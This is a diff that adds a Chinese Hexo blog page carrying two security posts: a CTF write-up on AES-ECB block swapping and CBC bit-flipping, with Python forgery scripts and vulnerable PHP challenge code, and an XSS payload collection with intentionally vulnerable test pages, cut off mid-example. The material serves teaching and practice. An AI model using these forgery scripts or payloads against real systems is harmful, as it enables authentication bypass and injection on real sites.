@@ -1,0 +1,1892 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/page/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-aes加密的安全问题" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/09/aes加密的安全问题/" class="article-date">
+  <time datetime="2019-03-08T16:00:00.000Z" itemprop="datePublished">2019-03-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/09/aes加密的安全问题/">aes加密的安全问题</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>本文由安全客原创发布<br>转载，请参考转载声明，注明出处： <a href="https://www.anquanke.com/post/id/173088" target="_blank" rel="noopener">https://www.anquanke.com/post/id/173088</a> </p>
+<h1 id="aes加密简介"><a href="#aes加密简介" class="headerlink" title="aes加密简介"></a>aes加密简介</h1><p>AES算法全称Advanced Encryption Standard,是DES算法的替代者，旨在取代DES成为广泛使用的标准，于2001年11月26日发布于FIPS PUB 197，并在2002年5月26日成为有效的标准。2006年，高级加密标准已然成为对称密钥加密中最流行的算法之一。</p>
+<p>AES是典型的对称加密算法，对称加密不同于md5 sha的哈希摘要算法，对称加密是可逆的，通常是明文+密钥，再利用算法来加密成密文，如果要还原也很简单，只要根据密钥+密文+生成算法的逆运算，即可解出，对称加密特点为可逆，并且加密解密都是使用同一个密钥，而非对称加密则是公钥私钥加解密模式这里不做讨论。</p>
+<h1 id="aes加密五种模式"><a href="#aes加密五种模式" class="headerlink" title="aes加密五种模式"></a>aes加密五种模式</h1><p>aes加密的方式有五种工作体制。  </p>
+<p>1.电码本模式（Electronic Codebook Book (ECB)）</p>
+<p>这种模式主要是将明文划分为几个明文段，分块加密，但是加密密钥是相同的。</p>
+<p>2.密码分组链接模式（Cipher Block Chaining (CBC)）  </p>
+<p>这种模式是先将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥进行加密。</p>
+<p>3.计算器模式（Counter (CTR)）<br>4.密码反馈模式（Cipher FeedBack (CFB)）<br>5.输出反馈模式（Output FeedBack (OFB)）</p>
+<p>其中分组如，aes-128-ecb即为16字节为一组，16字节即为128位。</p>
+<p>其他三种模式较为复杂，本文仅讨论前两种加密的安全性。</p>
+<h1 id="aes-ecb加密"><a href="#aes-ecb加密" class="headerlink" title="aes-ecb加密"></a>aes-ecb加密</h1><p><img src="https://s2.ax1x.com/2019/03/10/A9pPu6.jpg" alt>    </p>
+<p>aes-ecb加密是将一段明文，按照固定长度分组，然后对每一个分组，按照算法使用固定的密钥进行加密。假设123456加密。那么123为一组加密，456为一组加密，然后两段明文加密后的密文拼在一起，就算完整的密文。</p>
+<p>注意：这里每一组的加密都是使用相同的密钥，相同的算法，所以在这种机制下，很可能出现安全问题。</p>
+<p>比如：在身份认证中，查询用户是否是管理员还是普通用户，如果is_root=1则为管理员，如果不为1则为普通用户，如果采用aes-ecb加密，对原文进行分组加密。</p>
+<pre><code>明文：user_id:1.000000 is_root:0（其中is_root来判断是否为管理员。）  然后用一段密钥加算法进行加密。</code></pre><p>这种提交的加密数据是在cookie中提交，明文不可控，但是密文是可控的，但由于是进行分组进行，所以我们可以推算出每一分组明文对应的密文，假设明文八个一组来进行加密，分组后变为   （提示：仅仅是假设理想情况八位，实际并不是）</p>
+<pre><code>第一组：is_user 
+第二组：1.000000 
+第三组: is_root: 
+第四组： 0（不够的八位自动填充）
+
+其中user_id 通常情况下我们前端可以修改，进行修改为1.000000，此时原文被加密之后为四组 每组为八个数字的密文
+
+假设加密后密文为  
+
+c4ca4238a0b923820dcc509a6f75849b 在cookie中被提交，将密文分为四组
+
+c4ca4238
+a0b92382
+0dcc509a
+6f75849b</code></pre><p>此时密文我们是可控的，如果正常提交，服务器解密之后为user_id:1.000000 is_root:0，很显然我们不是管理员，但是如果将第二组密文和第四组密文替换呢，那么user_id就是0，is_root就是1.000000。服务器就解析为user_id:0xxxxxxx(xx为填充字符) is_root:1.000000，显然我们不需要知道密钥，同样可以进行绕过。</p>
+<p>还有一则在转账中，如果采用aes-128-ecb加密，在cookie中使用ecb分组加密，比如 </p>
+<p>付款人账户：<br>XXX   //假设密文abc<br>收款人账户：<br>XXX   //假设密文efg</p>
+<p>试想一下，一旦这个分组是刚好分为四组，我们仅仅将abc与efg交换，那不就造成了支付收款反转，几乎不需要什么技术就可以造成严重的攻击。</p>
+<h2 id="ctf-案例"><a href="#ctf-案例" class="headerlink" title="ctf-案例"></a>ctf-案例</h2><p>接下来以真实题目来进行详解。</p>
+<p>ctf address：<a href="https://mixer-f3834380.challenges.bsidessf.net/（国外的一道ctf）" target="_blank" rel="noopener">https://mixer-f3834380.challenges.bsidessf.net/（国外的一道ctf）</a></p>
+<p><img src="https://s2.ax1x.com/2019/03/10/ApRepR.png" alt></p>
+<p>首先尝试输入admin admin 登陆。</p>
+<p><img src="https://s2.ax1x.com/2019/03/10/Apg2Ps.png" alt></p>
+<p>返回内容重点为红色框内的东西，需要使得第三个参数 is_admin=1即可获得flag，但是session cookie并不是这个题关注的点，接下来就是抓包分析参数。修改参数。</p>
+<p><img src="https://s2.ax1x.com/2019/03/10/ApgXxx.png" alt></p>
+<p>经测试修改url，get cookie post传参都不能改变is_admin的值，所以只有一种可能，是在cookie里的user参数里加密了，然后传递给服务器，我们get参数传入的账号密码被服务器端加密，然后服务器返回来加密后的user信息。</p>
+<p>接下来测试是何种加密，测试为aes-ecb加密，那么是如何确定的呢，</p>
+<p>由于ecb是分组加密，所以一旦一组的密文我们修改了，其他组的密文解密之后是正常的，而被我们修改了的密文解密会是乱码，所以我们随便修改下user参数。</p>
+<p><img src="https://s2.ax1x.com/2019/03/10/Ap2GQ0.png" alt></p>
+<p>可以看到报错，并且第一组的密文解密后是乱码，而其他组的加密解密后为正常，所以猜测这一定是aes-ecb的分组加密的方式，</p>
+<p>此时，我们应该先确定分组，几个为一组，先破坏第一组加密然后破坏第二组加密，然后确定解密后json数据为，</p>
+<pre><code>{&quot;first_name&quot;:&quot;admin&quot;,&quot;last_name&quot;:&quot;admin&quot;,&quot;is_admin&quot;:0}</code></pre><p>总共为55个字符，</p>
+<pre><code>服务器密文为：d37c125ab4eae2ed02428d6d619016b06500bafffbeebe0c011977ad06c6946a45ba82569e93332195a36e61ae1fe26b325f7afd1eaa5ee8bb11efe6eebc5b54</code></pre><p>为128个字符，五十五个字符补位为64个字符，分组测试破坏每一组，测试到一组明文16个字符，加密密文为32个字符。</p>
+<p>明文分为四组，一组16个字符，密文分为四组，一组32个字符。</p>
+<pre><code>d37c125ab4eae2ed
+02428d6d619016b0
+6500bafffbeebe0c
+011977ad06c6946a
+45ba82569e933321
+95a36e61ae1fe26b
+325f7afd1eaa5ee8
+bb11efe6eebc5b54</code></pre><p>可控的范围是我们输入的账号密码 admin admin。</p>
+<p>{“first_name”:” 为十五个字符，我们首先构造账号为 a1.0000000000000}</p>
+<p>其中a是为了填充第一组，这样第一组就是{“first_name”:”a,这样剩下的1.0000000000000}就是十六个字符为一组，第二组就是1.0000000000000}，这样服务器加密后返回的第33-64位加密就是1.0000000000000}，我们让服务器帮我们加密，这样我们就不需要知道密钥和算法，让服务器帮我们加密任何我们想要的东西，提交数据。</p>
+<p><img src="https://s2.ax1x.com/2019/03/10/Apfii4.md.png" alt></p>
+<p>可以看到服务器返回了加密后的内容。我们截取第33位-64位字符。即为1.0000000000000}的密文。</p>
+<pre><code>3af6e4a9e05c702b02f9f4288c1c605c</code></pre><p>接下来就是需要填充位数。我们让服务器解密的json数据最后的0｝为第65 66位，因为如果这样的话，前64位刚好是四组，65 66为一组，正好将它32位的密文替换成我们构造的密文。</p>
+<p>{“first_name”:”admin”,”last_name”:”admin”,”is_admin”:0}</p>
+<p>五十五位的字符串，我们让好账号变为admin12345678900,那么字符串就是66位，正好符合多余出来的两位是0｝，最后这两位被填充之后的密文同样是32位，这样就可以替换我们构造的32位密文。</p>
+<p><img src="https://s2.ax1x.com/2019/03/10/AphF78.png" alt></p>
+<p>可以看到服务器构造成功得到flag。</p>
+<p>总结一下上面思路，我们根据每一组的加密密文长度固定明文长度固定，所以填充位数，然后让我们想要的数据成为单独的一组，让服务器进行加密，这样我们就可控制任意明文加密，然后修改cookie里提交的密文，填充字节，让我们需要的密文位置成为单独的一组，然后替换我们之前构造的一组数据，这样就可以绕过。</p>
+<p>此题值得一题的是双引号单引号反斜线等被过滤了，所以师傅们其他需要引入双引号等的不用尝试了。</p>
+<h1 id="aes-cbc加密"><a href="#aes-cbc加密" class="headerlink" title="aes-cbc加密"></a>aes-cbc加密</h1><p>这种模式是先将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥进行加密。aes-</p>
+<p><img src="https://s2.ax1x.com/2019/03/10/Ap5bmq.png" alt></p>
+<p>IV：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。</p>
+<p>秘钥：用于加密。</p>
+<p>密文块0：第一组密文被加密后的内容。（同样也是第二组明文加密过程中的IV）</p>
+<p>cbc加密方式不难理解，将一串明文进行分组，举例 123456789</p>
+<p>123为第一组，456为第二组，789为第三组，将123与IV异或加密（加密中IV只在第一次异或有用），得到的异或后的密文与密钥加密，假设此时第一组加密的最终密文为abc，那么456先于第一组的密文abc异或加密，得到的异或密文在与密钥加密，假设第二组最终密文为def，往复循环，def与第三组明文异或，然后和密钥加密，假设密文ghi，那么最终密文就是</p>
+<pre><code>abcdefghi并且将iv发送。</code></pre><p>其中值得一提的是初始始化向量IV每次随即初始化，所以即使相同的字符串也不会有相同的密文。</p>
+<h2 id="cbc字节反转攻击"><a href="#cbc字节反转攻击" class="headerlink" title="cbc字节反转攻击"></a>cbc字节反转攻击</h2><p>那么这种在这种加密的方式下，并不安全，问题出在异或加密这里，在讲解字节反转攻击前先了解下异或加密。  </p>
+<p>异或  xor 符号表示为 ^ ，计算机中 两个数字异或，相同为0，不同为1。 1^1=0  0^1=1  </p>
+<p>如果是字母异或加密，a^b，那么首先转化为ascii编码，然后二进制，对每一位进行异或得到的结果转为十进制，在ascii编码出来。  </p>
+<p><img src="https://s2.ax1x.com/2019/03/10/A9SRHS.png" alt></p>
+<p>异或有一个特性，任意值与自己本身做异或运算的结果都是0，任意值与0做异或运算的结果都是自己。本身a^b=乱七八糟，a^a则为空，但是a^a^任意字母=任意字母。</p>
+<p><img src="https://s2.ax1x.com/2019/03/10/A93FN4.png" alt><br><img src="https://s2.ax1x.com/2019/03/10/A99MW9.png" alt></p>
+<p>在CBC解密中，如图A是第一组的密文，B是第二组被解密的密文（未异或），C是明文。C=A^B。那么B=C^A，且A^B^C=0。如果我们更改A，A为我们可控的密文，C=A^B,如果我们使A=B^X，B=C^A,所以A=C^A^X,C=C^A^X^B=B^X^B=X。这里X是我们需要的任意字符，这便是CBC字节反转攻击的核心，这样一来C的明文就完全可控了。</p>
+<h2 id="简单的登录-cbc字节反转"><a href="#简单的登录-cbc字节反转" class="headerlink" title="简单的登录-cbc字节反转"></a>简单的登录-cbc字节反转</h2><p>原理说了很多，那么接下来实战一下。</p>
+<p>实验吧题目：<a href="http://ctf5.shiyanbar.com/web/jiandan/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/jiandan/index.php</a> </p>
+<p><img src="https://s2.ax1x.com/2019/03/11/ACS5W9.md.png" alt></p>
+<p>首先，输入框随便输入，然后发送请求抓包，看到返回包的头请求有tips，test.php。访问test.php即可看到源码。</p>
+<pre><code>&lt;?php
+define(&quot;SECRET_KEY&quot;, &apos;***********&apos;);
+define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);
+error_reporting(0);
+include(&apos;conn.php&apos;);
+function sqliCheck($str){
+    if(preg_match(&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str)){
+        return 1;
+    }
+    return 0;
+}
+function get_random_iv(){
+    $random_iv=&apos;&apos;;
+    for($i=0;$i&lt;16;$i++){
+        $random_iv.=chr(rand(1,255));
+    }
+    return $random_iv;
+}
+function login($info){
+    $iv = get_random_iv();
+    $plain = serialize($info);
+    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);//$plain为要加密的明文，METHOD加密方法，SECRET_KEY是秘钥，OPENSSL_RAW_DATA为数据格式，$iv随机生成的初始化向量。
+    setcookie(&quot;iv&quot;, base64_encode($iv));
+    setcookie(&quot;cipher&quot;, base64_encode($cipher));
+}
+function show_homepage()
+{
+    global $link;
+    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))
+    {
+        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);
+        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);
+
+        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))
+        {
+            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);
+            $sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;;
+            $result=mysqli_query($link,$sql);
+
+            if(mysqli_num_rows($result)&gt;0  or die(mysqli_error($link))){
+                $rows=mysqli_fetch_array($result);
+                echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&apos;.$rows[&apos;username&apos;].&apos;&lt;/center&gt;&lt;/h1&gt;&apos;;
+            }
+
+            else{
+                echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;
+            }
+        }
+        else
+        {
+            die(&quot;ERROR!&quot;);
+        }
+    }
+}
+if(isset($_POST[&apos;id&apos;])){
+    $id = (string)$_POST[&apos;id&apos;];
+    if(sqliCheck($id))
+        die(&quot;&lt;h1 style=&apos;color:red&apos;&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;);
+    $info = array(&apos;id&apos;=&gt;$id);
+    login($info);
+    echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;
+}else{
+    if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;])){
+        show_homepage();
+    }else{
+        echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt;
+                &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt;
+                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;
+                        &lt;div class=&quot;header&quot;&gt;
+                        &lt;h1&gt;Login Form&lt;/h1&gt;
+                        &lt;span&gt;input id to login&lt;/span&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;content&quot;&gt;
+                        &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;footer&quot;&gt;
+                        &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/form&gt;
+                &lt;/div&gt;
+            &lt;/body&gt;&apos;;
+    }
+}
+?&gt;</code></pre><p>前提：这一关不是单纯注入饶过的，肯定要利用cbc字节反转攻击。</p>
+<p>1.首先直接看在哪里可以得到flag，没传入ID参数的时候，如果cookie建立了iv 和 cipher参数，那么就可以调用show_homepage，执行sql查询，flag在数据库里查询。</p>
+<p>2.但是肯定要传参id，先生成iv 和 cipher，将id=X该数组进行序列化之后，以序列化结果和一个bs64编码随机数iv进行cbc加密生成密文cipher,加密算法为aes-128-cbc，此时就要考虑cbc字节反转了，128位，按十六字节分组。生成iv和cipher之后url编码返回请求头，生成细节参考自定义login函数。</p>
+<p>3.sql查询语句拼接了一个0，所以我们只要注释掉0便可进行我们的查询。所以可以利用cbc字节翻转攻击更改密文，更改解密后的id，从而绕过进行sqlwaf，cookie传入参数 cipher和iv,base64解码然后aes解密，php反序列化，如果不能反序列化，则输出base64编码，否则就sql语句拼接查询。如果有结果回显，否则输出hello。</p>
+<p>综上，只要我们能够CBC进行字节反转就可以执行sql查询，就可以进行查询flag。</p>
+<p>接下来第一步首先要cbc字节反转，修改密文中的id。不妨先测试下位数，如果传入id=12（因为我们要修改为1#），则序列化后内容为</p>
+<pre><code>a:1:{s:2:&quot;id&quot;;s:2:&quot;12&quot;;}</code></pre><p>由于我们需要分组，aes-128-cbc，128位16字节分组</p>
+<pre><code>第一组： a:1:{s:2:&quot;id&quot;;s:
+第二组： 2:&quot;12&quot;;}</code></pre><p>10中的0是第二组的第五个字符，所以需要更改第5个字符，右偏移四个字符，第一组也要向右偏移四个字符。接下来就是cbc字节反转脚本。</p>
+<pre><code># -*- coding:utf8 -*-
+from base64 import *
+import urllib
+
+cipher=&apos;fn060OBP%2FyLIGYrD9bi%2FlWWAS9RIWvEtALaV26kuB%2F8%3D&apos;#加密后的密文
+
+cipher_raw=b64decode(urllib.unquote(cipher))#首先urldecode解码，然后base64解码
+
+cipher_raw_list=list(cipher_raw)#将解码的密文分组
+
+py=4#偏移量为4
+A=cipher_raw_list[py]#要异或第二组密文的位置
+C=&apos;2&apos;#第二组被替换的明文
+X=&apos;#&apos;#将第二组替换掉的明文
+
+cipher_raw_list[py]=chr(ord(A)^ord(C)^ord(X))#将偏移量为4的替换。
+
+cipher_new=&apos;&apos;.join(cipher_raw_list)#使用&apos;&apos;将每一个字符连接起来，
+cipher_new=urllib.quote(b64encode(cipher_new))#将替换完的密文base64编码，urlencode编码。
+print cipher_new#打印出最终密文</code></pre><p>其中特意将ACX等变量对应上文所讲的参数。可参考上面cbc字节反转配合图来理解。然后生成反转后的密文：</p>
+<pre><code>fn060PFP/yLIGYrD9bi/lWWAS9RIWvEtALaV26kuB/8%3D</code></pre><p>此时提交密文发送服务器会返回base64编码字符串无法反序列化。</p>
+<p><img src="https://s2.ax1x.com/2019/03/12/APrM9I.png" alt><br>原因为下面这句。</p>
+<p><img src="https://s2.ax1x.com/2019/03/11/ACeARf.md.png" alt></p>
+<p>接下来我们需要修改IV，原理很简单，我们分为两组来进行加解密，第一组密文只参与第二组的异或，第一组修改完成后，第二组的解密是完全没有问题的，但是第一组被我们修改了一个字符，但是异或的IV还是原来的IV，必须要修改IV才能使第一组正常异或，得到结果。还是上述原理，三次异或，控制想要的结果。</p>
+<p>这里在看图，</p>
+<p><img src="https://s2.ax1x.com/2019/03/11/ACKCX8.md.png" alt></p>
+<p>A：这里特别要说明注意，A是我们第一次字节反转之后的明文（序列化状态）<br>B：原来的IV<br>C：字节反转后解密后的第一组（未被异或）<br>D: 正常的序列化字符串 ‘a:1:{s:2:”id”;s:’<br>E：新的IV</p>
+<p>A=B^C,因为我们A是字节反转这里我们可以看到，IV是原来的IV，但是A和C都是字节反转后的，所以A必然是个无法反序列化的明文，我们修改B也就是IV，使得异或得到正常的序列化字符串。  </p>
+<p>B=A^C,我们需要得到的结果是D=E^C，而C=B^A，所以D=E^B^A,那么E=B^A^D。 //建议初学者自己多分析下逻辑，多写写，干想很头疼。</p>
+<p>接下来是IV修改的脚本。</p>
+<pre><code># -*- coding:utf8 -*-
+__author__=&apos;pcat@chamd5.org&apos;
+
+from base64 import *
+import urllib
+iv=&apos;erUDGVSvM4Kab3ztg8vT8Q%3D%3D&apos;
+B=b64decode(urllib.unquote(iv))
+D=&apos;a:1:{s:2:&quot;id&quot;;s:&apos;
+A=b64decode(&apos;eFoXA0j/x2Em/bhfgeLzXjI6IjEjIjt9&apos;)
+iv_new=&apos;&apos;
+for i in range(16):
+    iv_new+=chr(ord(A[i])^ord(D[i])^ord(B[i]))
+iv_new=urllib.quote(b64encode(iv_new))
+print iv_new</code></pre><p>替换掉原来的IV，即可正常sql查询。</p>
+<p><img src="https://s2.ax1x.com/2019/03/12/APsMa4.md.png" alt></p>
+<p>至此，此题的cbc反转我们已经完成了，剩下的注入原理一样，注入不是本题的目的，也就不再发剩下的脚本了。CBC还是要自己写一下用图理解一下。</p>
+<p>其余加密问题，后续我会补充到本文。</p>
+<p>参考：<a href="https://www.yourhome.ren/index.php/sec/366.html" target="_blank" rel="noopener">https://www.yourhome.ren/index.php/sec/366.html</a><br>参考：实验吧pcat师傅的writeup</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/03/09/aes加密的安全问题/" data-id="ck0l0oh98000hpy2is60u26nh" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-XSS姿势小集" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/04/XSS姿势小集/" class="article-date">
+  <time datetime="2019-03-03T16:00:00.000Z" itemprop="datePublished">2019-03-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/04/XSS姿势小集/">XSS姿势小集</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于XSS攻击原理很简单，用百度一段话，本文重点在记录一些绕过姿势。</p>
+<p>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被骇客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，骇客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。</p>
+<p>个人理解：XSS较为简单，理解起来也比较简单，一部分代码可控，并且显示在网页中，并且能够解析，就能够造成XSS漏洞，一般解析javascript来造成攻击。</p>
+<h1 id="转先知社区上几个payload（无过滤）"><a href="#转先知社区上几个payload（无过滤）" class="headerlink" title="转先知社区上几个payload（无过滤）"></a>转先知社区上几个payload（无过滤）</h1><p>参考：<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p>
+<pre><code>&lt;scirpt&gt;
+&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;
+
+&lt;img&gt;
+&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;
+
+&lt;input&gt;
+&lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot;&gt;
+
+竞争焦点，从而触发onblur事件
+&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;
+
+通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
+&lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot; autofocus&gt;
+
+&lt;details&gt;
+&lt;details ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt;
+
+使用open属性触发ontoggle事件，无需用户去触发
+&lt;details open ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt;
+
+&lt;svg&gt;
+&lt;svg onload=alert(&quot;xss&quot;);&gt;
+
+&lt;select&gt;
+&lt;select onfocus=alert(1)&gt;&lt;/select&gt;
+
+通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
+&lt;select onfocus=alert(1) autofocus&gt;
+
+&lt;iframe&gt;
+&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;
+
+&lt;video&gt;
+&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;
+
+&lt;audio&gt;
+&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;
+
+&lt;body&gt;
+&lt;body/onload=alert(&quot;xss&quot;);&gt;
+
+利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发
+
+&lt;body
+onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;
+
+&lt;textarea&gt;
+&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;
+
+&lt;keygen&gt;
+&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐
+
+&lt;marquee&gt;
+&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; </code></pre><p>补充</p>
+<pre><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</code></pre><h1 id="XSS环境"><a href="#XSS环境" class="headerlink" title="XSS环境"></a>XSS环境</h1><p>phpstudy  </p>
+<p>Apache+PHP 5.4</p>
+<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_POST[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+echo &quot;&lt;input type=text value=&quot;.$ss.&quot;&gt;&quot;;
+?&gt;</code></pre><p>需要闭合前面的尖括号，才能解析。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;</code></pre><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+echo &quot;&lt;input type=text value=&apos;&quot;.$ss.&quot;&apos;&gt;&quot;;
+?&gt;</code></pre><p>这一关增加单引号，闭合前面的尖括号，并且闭合单引号，才能解析。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&apos;&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;</code></pre><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
